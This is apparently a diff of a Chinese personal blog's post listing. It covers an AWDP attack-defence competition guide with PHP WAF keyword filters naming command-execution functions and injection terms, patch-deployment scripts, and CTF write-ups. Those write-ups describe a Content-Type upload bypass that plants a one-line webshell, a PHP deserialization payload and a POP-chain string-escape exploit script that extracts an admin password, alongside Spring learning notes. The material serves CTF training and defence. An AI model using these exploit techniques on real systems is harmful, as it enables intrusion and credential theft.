-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907115250.png"></li>
-<li>  逐条分析流量，当字符偏移量改变时，即为此数据通过，记录此数据</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220907115327.png"></li>
-<li>  编写脚本逐条分析即可获得flag</li>
-</ol>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/mysql%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/">
-                phpstudy的mysql服务打开后闪退问题解决方法
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-06</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/mysql%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/phpstudy/">phpstudy</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="phpstudy的mysql服务打开后闪退"><a href="#phpstudy的mysql服务打开后闪退" class="headerlink" title="phpstudy的mysql服务打开后闪退"></a>phpstudy的mysql服务打开后闪退</h1><ol>
-<li><p>  极大可能是端口冲突的问题</p>
-</li>
-<li><p>  用管理员权限打开终端,输入以下命令,删除服务，数据库内容不会丢失</p>
-</li>
-<li><pre><code>  sc delete mysql
-</code></pre>
-</li>
-<li><p>  删除后就可以从phpstudy中打开mysql服务了</p>
-</li>
-</ol>
-<p>什么是adwp？<br>AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。</p>
-<p>比赛中，每支队伍拥有相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，并向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛队伍的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛队伍具备该漏洞的防御能力。</p>
-<p>计分规则如下：比赛过程中每支参赛队拥有相同的起始分数（10000分），截止比赛结束时的分数，作为各队伍比赛得分，由高至低在成绩榜排列。</p>
-<p>参赛队伍可通过以下两种方式获取积分：</p>
-<p>1）攻克：提交GameBox中存放的flag；</p>
-<p>2）防御：成功防御平台对各个靶机的攻击，且服务无异常。</p>
-<p>同时也会通过以下两种方式失分：</p>
-<p>1）服务异常：队伍无法维护某GameBox的正常服务，平台检查不通过；</p>
-<p>2）违规：因违反比赛纪律及发现违规等行为被裁判判罚扣分。</p>
-<p>六种状态<br>–已攻击，说明这个题已经打下来了，交了flag，就是攻击成功。攻击的过程其实就是普通的ctf。有的题目会先给你一切源码让你来打，这就是白盒了，但是白盒还是很多题防御成功但打不出flag哈哈。有的题你只有黑盒打出flag来了，攻击成功才会给你源码，让你来防御。</p>
-<p>–已防御，说明你拿到源码之后，把这个题的漏洞通过修改源码，已经补完了，裁判的poc打不动这个题了，就算是防御成功。</p>
-<p>–防御异常，说明防御的过程中，你把网站应该提供的服务给搞没了，可能是防御过度，也可能是你把关键的功能删掉了。如果防御异常了，一定要第一时间重置环境，要不然等到一个轮次结束之后会扣分，扣分就特别伤了。</p>
-<p>防御<br>赛前准备<br>1.赛前要做好充分准备，把一些漏洞的waf全部准备好，例如：</p>
-<p>function wafrce($str){<br>    return !preg_match(“/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i”, $str);<br>}</p>
-<p>function wafsqli($str){<br>    return !preg_match(“/select|and|*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|&quot;|&#39;|^||/i”, $str);<br>}</p>
-<p>function wafxss($str){<br>    return !preg_match(“/&#39;|http|&quot;|`|cookie|&lt;|&gt;|script/i”, $str);<br>}<br>这些waf有点简陋，是因为要保证题目的环境不能出问题，题目要提供正常的服务。</p>
-<p>这很重要很重要，直接决定能不能很快拿下题目的防御。</p>
-<p>2.XFTP</p>
-<p>文件上传工具要准备好</p>
-<p>下载：</p>
-<p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1eabfwy7b8TlM-0fquWAYxw">https://pan.baidu.com/s/1eabfwy7b8TlM-0fquWAYxw</a><br>提取码：g32d</p>
-<p>3.phpstudy等web环境</p>
-<p>配置好本地web环境，越方便越好，就是拿到源码之后要很迅速能在自己本地跑起来，不要到了比赛的时候手忙脚乱的，一下子域名出问题一下子数据库出问题。比赛时，时间就是分！！</p>
-<p>4.代码审计工具</p>
-<p>Seay源代码审计系统之类的。</p>
-<p>可以做到辅助作用，不是很重要。</p>
-<p>第一时间上waf<br>对于awdp来说，防御的重要性远远大于攻击，因为是轮次制，每一轮防御成功或者攻击成功都会加对应的分，成功的人越多，每轮加的分就越少，而且分是累计制，<strong>题目分少了，自己之前得到的分不会扣。</strong>所以时间特别重要。有些人题目刚出没5分钟就防御成功了，一个题的分吃了一整天，从第一轮加500到最后一轮加50，累积起来大几千分。</p>
-<p>所以我们的策略是，一上来一个题目，先分析是大概什么知识点，是命令执行？sql注入？文件上传？然后第一时间在源代码上加waf。</p>
-<p>waf的形式不局限于上面展示的例子，过滤关键字，也可以是直接对输入的东西进行长度限制，比如说限制输入执行命令的长度为小于2。就可以达到修补漏洞又不破坏题目环境的目的。不过也要看具体题目，有的题目可能长度低于2就破坏了web服务导致防御失败了。</p>
-<p>注意文件上传的路径<br>这个问题非常重要！！！</p>
-<p>防御的时候我们是要把要修补的文件上传到服务器里，替换原来服务器中的文件，所以我们要知道文件具体的路径，但是一般来说题目不会直接给，不同开发语言不同框架的目录也不尽相同。</p>
-<p>这个时候就要用到一个小tips：</p>
-<p>题给示例：</p>
-<p>mv -f explorer.php  /www/html/<br>1<br>我们要替换的文件很有可能不是在根目录下的/www/html，所以这个示例很鸡肋</p>
-<p>那就从根目录里面查找：</p>
-<p>mv -f explorer.php $(dirname <code>find / -name &#39;explorer.php&#39; 2&gt;/dev/null</code>)/explorer.php<br>1<br>用find命令从根目录查找名为explorer.php的文件，然后返回他的路径名（dirname）</p>
-<p>2&gt;/dev/null的作用是避免返回一些错误的信息，比如说查找过程中会返回权限不足等错误。</p>
-<p>patch包<br>patch包的内容组成<br>首先是存在漏洞的页面，比如index.php或app.py<br>再次的部署的sh文件，如果是php，就需要替换原题目存在漏洞的php页面，如果是pyhton或者java就得替换文件再重启服务<br>例子：<br>php update.sh</p>
-<p>#!/bin/bash</p>
-<p>cp /index.php /var/www/html/index.php<br>Python</p>
-<p>#!/bin/sh</p>
-<p>cp /app.py /app/app.py<br>ps -ef | grep python | grep -v grep | awk ‘{print $2}’ | xargs kill -9<br>cd /app &amp;&amp; nohup python app.py  &gt;&gt; /opt/app.log 2&gt;&amp;1 &amp;</p>
-<p>Go</p>
-<p>#!/bin/bash</p>
-<p>kill -9 $(pidof app)<br>cp ezgo_patch /app<br>chmod +x /app<br>/app 2&gt;&amp;1 &gt;/dev/null &amp;<br>1<br>2<br>3<br>4<br>5<br>6<br>Nodejs</p>
-<p>#!/bin/sh</p>
-<p>cp server.js /app/server.js<br>ps -ef | grep node | grep -v grep | awk ‘{print $2}’ | xargs kill -9<br>cd /app &amp;&amp; nohup node server.js  &gt;&gt; /opt/aa.log 2&gt;&amp;1 &amp;<br>1<br>2<br>3<br>4<br>5<br>格式要求：一般会要求tar.gz的形式<br>打包命令：tar zcvf update.tar.gz send.php update.sh</p>
-<p>攻击<br>攻击就没什么好讲的，就是打ctf，有的题是白盒，有的题你得先打出flag才有源码。</p>
-<p>暂时想到的就是这些，打完了这么久了才记录，因为一直考试。</p>
-<p>在这致敬一下工作室大佬们带我打awdp！</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/Upload/">
-                给毕师傅打工的题目wp
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-09-03</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/Upload/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/CTF/">CTF</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><ol>
-<li><p>  文件类型绕过攻击</p>
-</li>
-<li><p>  打开代理，和burpsuit走一个端口</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903193634.png"></p>
-</li>
-<li><p>  随意发一个文件，抓包</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903193730.png"></p>
-</li>
-<li><p>  将Content-Type修改为 image/gif</p>
-</li>
-<li><p>  Content-Type决定了服务器以什么方式解读文件，且Content-Type是客户端可以修改的</p>
-</li>
-<li><p>  以image/gif的方式上传一句话木马</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194220.png"></p>
-</li>
-<li><p>  链接蚁剑，在根目录找到flag</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194402.png"></p>
-</li>
-<li><p>  打开即可获得flag</p>
-</li>
-<li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903194416.png"></p>
-</li>
-</ol>
-<h1 id="midserialize"><a href="#midserialize" class="headerlink" title="midserialize"></a>midserialize</h1><ol>
-<li><p>```php</p>
-  <?php
-  error_reporting(0);
-  include('flag.php');
-  highlight_file(__FILE__);
-  class Sxsec{
-      public $token;
-      public $password;
+  逐条分析流量，当字符偏移量改变时，即为此数据通过，记录此数据
   
-      public function __construct($t,$p){
-          $this->token=$t;
+  编写脚本逐条分析即可获得flag
+
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/mysql%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/" title="phpstudy的mysql服务打开后闪退问题解决方法">phpstudy的mysql服务打开后闪退问题解决方法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-06T09:42:34.968Z" title="发表于 2022-09-06 17:42:34">2022-09-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/phpstudy/">phpstudy</a></span></div><div class="content">phpstudy的mysql服务打开后闪退
+  极大可能是端口冲突的问题
+
+  用管理员权限打开终端,输入以下命令,删除服务，数据库内容不会丢失
+
+  sc delete mysql
+
+
+  删除后就可以从phpstudy中打开mysql服务了
+
+
+什么是adwp？AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。
+比赛中，每支队伍拥有相同配置的虚拟靶机，参赛队员需对平台中的GameBox发起攻击，并向平台提交正确的flag（证明自己具备对该题的攻击能力）；在此期间，由平台以轮次制的方式向参赛队伍的靶机发起攻击，检查其他选手的漏洞是否修补成功，若修补成功则认为参赛队伍具备该漏洞的防御能力。
+计分规则如下：比赛过程中每支参赛队拥有相同的起始分数（10000分），截止比赛结束时的分数，作为各队伍比赛得分，由高至低在成绩榜排列。
+参赛队伍可通过以下两种方式获取积分：
+1）攻克：提交GameBox中存放的flag；
+2）防御：成功防御平台对各个靶机的攻 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/Upload/" title="给毕师傅打工的题目wp">给毕师傅打工的题目wp</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-03T11:35:19.528Z" title="发表于 2022-09-03 19:35:19">2022-09-03</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">Upload
+  文件类型绕过攻击
+
+  打开代理，和burpsuit走一个端口
+
+  
+
+  随意发一个文件，抓包
+
+  
+
+  将Content-Type修改为 image/gif
+
+  Content-Type决定了服务器以什么方式解读文件，且Content-Type是客户端可以修改的
+
+  以image/gif的方式上传一句话木马
+
+  
+
+  链接蚁剑，在根目录找到flag
+
+  
+
+  打开即可获得flag
+
+
+
+
+midserialize
+```php
+  token=$t;
           $this->password = $p;
       }
       public function login(){
@@ -1701,1177 +290,73 @@ git clone https:&#x2F;&#x2F;github.com&#x2F;FluxionNetwork&#x2F;fluxion.git<span
   
   if($sxsec ->login()){
    
-      echo $flag;
-  }else{
+      echo $fl ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="Spring学习笔记">Spring学习笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-08-29T11:58:28.605Z" title="发表于 2022-08-29 19:58:28">2022-08-29</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/Javaweb/">Javaweb</a></span></div><div class="content">Spring学习笔记一定要区分mapper,service,和controller
+  mapper是用来控制数据库
+  service主要实现业务逻辑
+  controller与前端交互
+
+MVC模式
   
-  echo "NO";
-  }
+  controller,view,model分别对应一个文件夹
   
   
-  ?>  <pre class="line-numbers language-none"><code class="language-none">
-2.   看到题目是unserialize,需要serialize一下
-
-3.   &#96;&#96;&#96;php
-     &lt;?php
-     class Sxsec&#123;
-         public $token&#x3D;&#39;lin&#39;;
-         public $password;
-         public function __construct($t,$p)&#123;
-         $this-&gt;token&#x3D;&amp;$this-&gt;password;
-     &#125;
-     &#125;
-     $pop&#x3D;new Sxsec();
-     echo urlencode(serialize($pop));
-     ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  得到</p>
-</li>
-<li><p>```php<br>  O%3A5%3A%22Sxsec%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D&amp;a[]=a&amp;b[]=b&amp;c=0e215962017</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-6.   get传参传给sxsec即可获得flag
-
-7.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220903195743.png)
-
-
-
-# 40300
-
-1.   try to flag.txt
-2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220903195821.png)
-3.   在url后面拼接flag.txt
-4.   访问得到flag
-5.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220903195923.png)
-
-
-
-# 40315
-
-1.   第一步：打开网页，dirsearch扫到了www.zip审计源码,有个safe方法可以进行字符逃逸
-
-2.   &#96;&#96;&#96;
-     function safe($parm)&#123;
-         $array&#x3D; array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);
-         return str_replace($array,&#39;hacker&#39;,$parm);
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>第二步：</p>
-<p>  寻找pop链，可以利用UpdateHelper的__destruct触发User的__toString然后走到Info的__call方法，在__call中调用了dbCtrl类的login方法，通过控制查询语句，把admin账户的密码查出来</p>
-</li>
-<li><pre><code class="php">  &lt;?php
-   class *User*
-   &#123;
-     public $age=&#39;select password,id from user where username=?&#39;;
-     public $nickname=null;
-   &#125;
-   class *Info*&#123;
-     public $age;
-     public $nickname;
-     public $CtrlCase;
-   &#125;
-   class *UpdateHelper*
-   &#123;
-     public $sql;
-   &#125;
-   class *dbCtrl*
-   &#123;
-     public $hostname = &quot;127.0.0.1&quot;;
-     public $dbuser=&quot;noob123&quot;;
-     public $dbpass=&quot;noob123&quot;;
-     public $database=&quot;noob123&quot;;
-     public $name=&#39;admin&#39;;
-     public $token = &#39;admin&#39;;
-   &#125;
   
-   function post($data)&#123;
-     $data = http_build_query($data);
-     $opts = array (
-       &#39;http&#39; =&gt; array (
-         &#39;method&#39; =&gt; &#39;POST&#39;,
-         &#39;header&#39;=&gt; &quot;Content-type: application/x-www-form-urlencoded\r\n&quot; .
-           &quot;Content-Length: &quot; . strlen($data) . &quot;\r\n&quot;,
-         &#39;content&#39; =&gt; $data
-       )
-     );
-     $html = file_get_contents(&#39;http://127.0.0.1:8085/index.php?action=update&#39;, false, stream_context_create($opts));
-     echo $html;
-   &#125;
   
-   $x = new UpdateHelper();
-   $x-&gt;sql = new User();
-   $x-&gt;sql-&gt;nickname = new Info();
-   $x-&gt;sql-&gt;nickname-&gt;CtrlCase = new dbCtrl();
   
-   $p = &#39;&quot;;s:8:&quot;CtrlCase&quot;;&#39; . serialize($x) . &quot;&#125;&quot;;
-   $p = str_repeat(&#39;union&#39;, strlen($p)).$p;
-   echo($p);
+
+
+前端后端，分离不分离的区别
+  每一个用户操作的就是客户端
+  后端是用spring搭建
+  前端有两个可以搭建的方式：web和app
+  用户打开网页，本质是向服务器发送了一个链接（请求），服务器接收到了请求之后，会返回一个页面，这个页面是以字符串表单的形式返回的，浏览器接收之后会自动转化
+  前后端不分离：客户端发送一个请求，服务端直接返回了一个表单
+  前后端分离：客户端发送一个请求，不会直接调用服务端的数据，而是会从web端返回一个html，css的表单，等到调用的时候才会去调用服务端的数据，图解如下
   
-   post([
-     &#39;age&#39; =&gt; 123,
-     &#39;nickname&#39; =&gt; $p
-   ]);
-  <pre class="line-numbers language-none"><code class="language-none">
-payload:
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-  unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;
-</code></pre>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903205337.png"></p>
-</li>
-<li><p>  得到密码后，登录得到flag</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903210434.png"></p>
-</li>
-</ol>
 
-        </div>
-    
+MVC模式
+  每一个链接对应一个函数
+  C：controller,负责向用户返回一个数据的控制器
+  V：视图，html
+  M：model，数据库调用
 
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-                Spring学习笔记
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2022-08-29</span>
-            
-            
-                <a href="http://dezhoutorizhao.github.io/Spring%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#disqus_thread" class="comments article-comment-link">留言</a>
-            
-            
-                <span class="category">
-                    <a href="/categories/Javaweb/">Javaweb</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="Spring学习笔记"><a href="#Spring学习笔记" class="headerlink" title="Spring学习笔记"></a>Spring学习笔记</h1><h2 id="一定要区分mapper-service-和controller"><a href="#一定要区分mapper-service-和controller" class="headerlink" title="一定要区分mapper,service,和controller"></a>一定要区分mapper,service,和controller</h2><ol>
-<li>  mapper是用来控制数据库</li>
-<li>  service主要实现业务逻辑</li>
-<li>  controller与前端交互</li>
-</ol>
-<h2 id="MVC模式"><a href="#MVC模式" class="headerlink" title="MVC模式"></a>MVC模式</h2><ol>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903153707.png"></li>
-<li>  controller,view,model分别对应一个文件夹</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903153825.png"></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903154156.png"></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903155227.png"></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220903155332.png"></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/2J27OL_GL%7D4N79A2GA5WCZI.png"></li>
-<li></li>
-</ol>
-<h2 id="前端后端，分离不分离的区别"><a href="#前端后端，分离不分离的区别" class="headerlink" title="前端后端，分离不分离的区别"></a>前端后端，分离不分离的区别</h2><ol>
-<li>  每一个用户操作的就是客户端</li>
-<li>  后端是用spring搭建</li>
-<li>  前端有两个可以搭建的方式：web和app</li>
-<li>  用户打开网页，本质是向服务器发送了一个链接（请求），服务器接收到了请求之后，会返回一个页面，这个页面是以字符串表单的形式返回的，浏览器接收之后会自动转化</li>
-<li>  前后端不分离：客户端发送一个请求，服务端直接返回了一个表单</li>
-<li>  前后端分离：客户端发送一个请求，不会直接调用服务端的数据，而是会从web端返回一个html，css的表单，等到调用的时候才会去调用服务端的数据，图解如下</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829195453.png"></li>
-</ol>
-<h2 id="MVC模式-1"><a href="#MVC模式-1" class="headerlink" title="MVC模式"></a>MVC模式</h2><ol>
-<li>  每一个链接对应一个函数</li>
-<li>  C：controller,负责向用户返回一个数据的控制器</li>
-<li>  V：视图，html</li>
-<li>  M：model，数据库调用</li>
-</ol>
-<h2 id="创建后端项目"><a href="#创建后端项目" class="headerlink" title="创建后端项目"></a>创建后端项目</h2><ol>
-<li>  在spring initializer中选择<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829200650.png"></li>
-<li>  选择spring web和thymleaf</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829200831.png"></li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829200844.png"></li>
-<li>  记住不要初始化git</li>
-</ol>
-<h2 id="Controller"><a href="#Controller" class="headerlink" title="Controller"></a>Controller</h2><ol>
-<li><p>```java<br>  package com.kob.backend.controller.pk;</p>
-<p>  import org.springframework.stereotype.Controller;<br>  import org.springframework.web.bind.annotation.RequestMapping;</p>
-<p>  @Controller<br>  @RequestMapping(value=”/pk/“)//注解的内容详见Java面向对象<br>  public class IndexController {</p>
-<pre><code>  @RequestMapping(&quot;index/&quot;)
-  public String index()&#123;
-      return &quot;pk/index.html&quot;; //这个地方返回的是一个路径，所以是String类型
-  &#125;
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   前端页面添加在templates下创建各自模块的文件夹（注意这个地方是文件夹，而不是package）
-
-3.   在类上定义@RequestMapping,提供初步的请求映射信息，相对于Web应用的根目录
-
-4.   在方法上定义@RequestMapping,提供进一步的细分信息，相对于类定义处的URL
-
-5.   如果对方法不写@RequestMapping的话，则不能访问后面方法中写的return的路径
-
-## template
-
-1.   template中存放的是html页面
-
-## static
-
-1.   static中一般创建三个目录，分别是CSS,JS,image
-
-## 以上是前后端不分离的写法
-
-_______________________
-
-# 前后端分离的写法
-
-1.   前后端分离，后端只会返回数据
-
-2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830194938.png)
-
-3.   List&lt;String&gt; 数据类型
-
-     
-
-## 改端口
-
-1.   可以在 **templates** 的 **application.properties** 中修改端口
-2.   如果使用默认的官方的网址，则properties文件是空的
-3.   因为vue的默认端口也是8080
-
-## JDBC
-
-![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830223222.png)
-
-![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830223651.png)
-
-![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220830225133.png)
-
-1.   idea中可以查看到数据库的可视化界面
-
-## 添加数据库依赖
-
-1.   maven仓库官方地址[Just a moment... (mvnrepository.com)](https:&#x2F;&#x2F;mvnrepository.com&#x2F;)
-
-2.   第一个spring boot of JDBC(好像是这个名吧)
-
-3.   &#96;&#96;&#96;
-     &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;org.springframework.boot&#x2F;spring-boot-starter-jdbc --&gt;
-     &lt;dependency&gt;
-         &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
-         &lt;artifactId&gt;spring-boot-starter-jdbc&lt;&#x2F;artifactId&gt;
-         &lt;version&gt;2.7.1&lt;&#x2F;version&gt;
-     &lt;&#x2F;dependency&gt;
-     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  直接复制进pom.xml中</p>
-</li>
-<li><p>  在pom.xml中查询dependencies,添加到dependencies的下一级中，和其它dependeny同级</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220830230121.png"></p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220830230135.png"></p>
-</li>
-<li><p>  第二个，Project Lombok</p>
-</li>
-<li><p>```</p>
-  <!-- https://mvnrepository.com/artifact/org.projectlombok/lombok -->
-  <dependency>
-      <groupId>org.projectlombok</groupId>
-      <artifactId>lombok</artifactId>
-      <version>1.18.14</version>
-      <scope>provided</scope>
-  </dependency>
